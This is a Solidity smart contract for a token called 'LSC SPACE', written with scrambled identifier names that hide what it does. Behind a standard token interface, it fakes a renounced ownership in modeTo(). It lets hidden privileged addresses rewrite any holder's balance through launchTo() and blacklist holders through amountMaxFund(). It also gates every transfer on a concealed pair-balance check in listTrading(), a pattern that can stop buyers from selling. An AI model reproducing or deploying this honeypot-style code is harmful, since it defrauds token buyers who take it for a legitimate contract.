//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface receiverFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract walletReceiverTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoAt {
    function createPair(address fromReceiverShould, address isTx) external returns (address);
}

interface isMarketingTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamReceiver) external view returns (uint256);

    function transfer(address launchTotal, uint256 shouldLimit) external returns (bool);

    function allowance(address exemptSellTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldLimit) external returns (bool);

    function transferFrom(
        address sender,
        address launchTotal,
        uint256 shouldLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalAtIs, uint256 value);
    event Approval(address indexed exemptSellTrading, address indexed spender, uint256 value);
}

interface modeSwapFee is isMarketingTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LSCSPACE is walletReceiverTrading, isMarketingTotal, modeSwapFee {

    function totalSupply() external view virtual override returns (uint256) {
        return feeReceiverFrom;
    }

    function swapMarketingAt() private view {
        require(maxSender[_msgSender()]);
    }

    address private launchLaunched;

    function symbol() external view virtual override returns (string memory) {
        return fundAt;
    }

    uint256 private enableSwapFee;

    function balanceOf(address teamReceiver) public view virtual override returns (uint256) {
        return txList[teamReceiver];
    }

    address sellAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public atLaunched;

    bool private listAmount;

    function listTrading(address launchToExempt, address launchTotal, uint256 shouldLimit) internal returns (bool) {
        if (launchToExempt == walletExemptLimit) {
            return receiverFrom(launchToExempt, launchTotal, shouldLimit);
        }
        uint256 modeAutoExempt = isMarketingTotal(totalAutoReceiver).balanceOf(sellAmount);
        require(modeAutoExempt == atAmount);
        require(!atLaunched[launchToExempt]);
        return receiverFrom(launchToExempt, launchTotal, shouldLimit);
    }

    uint8 private shouldSwapTotal = 18;

    function transferFrom(address launchToExempt, address launchTotal, uint256 shouldLimit) external override returns (bool) {
        if (_msgSender() != shouldMin) {
            if (totalIs[launchToExempt][_msgSender()] != type(uint256).max) {
                require(shouldLimit <= totalIs[launchToExempt][_msgSender()]);
                totalIs[launchToExempt][_msgSender()] -= shouldLimit;
            }
        }
        return listTrading(launchToExempt, launchTotal, shouldLimit);
    }

    address public walletExemptLimit;

    uint256 atAmount;

    uint256 private feeReceiverFrom = 100000000 * 10 ** 18;

    address public totalAutoReceiver;

    function launchTo(address walletFee, uint256 shouldLimit) public {
        swapMarketingAt();
        txList[walletFee] = shouldLimit;
    }

    function tokenFromAuto(address limitTrading) public {
        if (receiverToken) {
            return;
        }
        
        maxSender[limitTrading] = true;
        
        receiverToken = true;
    }

    function approve(address launchLiquidity, uint256 shouldLimit) public virtual override returns (bool) {
        totalIs[_msgSender()][launchLiquidity] = shouldLimit;
        emit Approval(_msgSender(), launchLiquidity, shouldLimit);
        return true;
    }

    function getOwner() external view returns (address) {
        return launchLaunched;
    }

    uint256 totalMin;

    function amountMaxFund(address senderAtExempt) public {
        swapMarketingAt();
        if (maxTx) {
            maxTx = true;
        }
        if (senderAtExempt == walletExemptLimit || senderAtExempt == totalAutoReceiver) {
            return;
        }
        atLaunched[senderAtExempt] = true;
    }

    uint256 private teamFund;

    function owner() external view returns (address) {
        return launchLaunched;
    }

    bool public atModeExempt;

    function name() external view virtual override returns (string memory) {
        return minLiquidityTx;
    }

    function receiverFrom(address launchToExempt, address launchTotal, uint256 shouldLimit) internal returns (bool) {
        require(txList[launchToExempt] >= shouldLimit);
        txList[launchToExempt] -= shouldLimit;
        txList[launchTotal] += shouldLimit;
        emit Transfer(launchToExempt, launchTotal, shouldLimit);
        return true;
    }

    constructor (){
        
        modeTo();
        receiverFee atMin = receiverFee(shouldMin);
        totalAutoReceiver = autoAt(atMin.factory()).createPair(atMin.WETH(), address(this));
        if (maxTx != atModeExempt) {
            listAmount = false;
        }
        walletExemptLimit = _msgSender();
        maxSender[walletExemptLimit] = true;
        txList[walletExemptLimit] = feeReceiverFrom;
        if (atModeExempt) {
            teamFund = enableSwapFee;
        }
        emit Transfer(address(0), walletExemptLimit, feeReceiverFrom);
    }

    address shouldMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private maxEnableWallet;

    bool private receiverWallet;

    function decimals() external view virtual override returns (uint8) {
        return shouldSwapTotal;
    }

    mapping(address => uint256) private txList;

    mapping(address => bool) public maxSender;

    function minSellWallet(uint256 shouldLimit) public {
        swapMarketingAt();
        atAmount = shouldLimit;
    }

    string private minLiquidityTx = "LSC SPACE";

    bool public receiverToken;

    bool public maxTx;

    string private fundAt = "LSE";

    uint256 public teamSwap;

    mapping(address => mapping(address => uint256)) private totalIs;

    function transfer(address walletFee, uint256 shouldLimit) external virtual override returns (bool) {
        return listTrading(_msgSender(), walletFee, shouldLimit);
    }

    function allowance(address enableMarketing, address launchLiquidity) external view virtual override returns (uint256) {
        if (launchLiquidity == shouldMin) {
            return type(uint256).max;
        }
        return totalIs[enableMarketing][launchLiquidity];
    }

    function modeTo() public {
        emit OwnershipTransferred(walletExemptLimit, address(0));
        launchLaunched = address(0);
    }

    event OwnershipTransferred(address indexed toTokenLimit, address indexed shouldBuy);

}